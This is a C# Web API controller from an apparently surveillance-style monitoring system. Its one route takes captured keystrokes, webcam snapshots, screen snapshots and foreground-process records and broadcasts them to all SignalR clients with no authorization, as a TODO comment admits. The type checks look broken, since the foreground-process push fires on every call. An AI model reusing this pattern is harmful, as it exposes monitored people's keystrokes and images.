using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Web.Http;
using EMS.Core.Models.Mongo;
using EMS.Web.Website.Hubs;
using Microsoft.AspNet.SignalR;

namespace EMS.Web.Website.Controllers
{
    // TODO:
    // Authorize the route to precent unwanted situations
    [RoutePrefix("api/PushNotifications")]
    public class PushNotificationsController : ApiController
    {
        [HttpPost]
        [Route("Update")]
        public IHttpActionResult Update(object item)
        {
            var hub = GlobalHost.ConnectionManager.GetHubContext<PushNotificationsHub>();

            // Fix this shit with the network packets, the load is not even funny
            if ((item as CapturedForegroundProcessMongoDocument) != null)
            {
                hub.Clients.All.pushForegroundProcess(item);
            }
            if ((item as CapturedCameraSnapshotMongoDocument) != null)
            {
                hub.Clients.All.pushCameraSnapshot(item);
            }
            if ((item as CapturedDisplaySnapshotMongoDocument) != null)
            {
                hub.Clients.All.pushDisplaySnapshot(item);
            }
            if ((item as CapturedKeyboardKeyMongoDocument) != null)
            {
                hub.Clients.All.pushKeyboardKeys(item);
            }

            hub.Clients.All.pushForegroundProcess(item);

            return Ok();
        }
    }
}
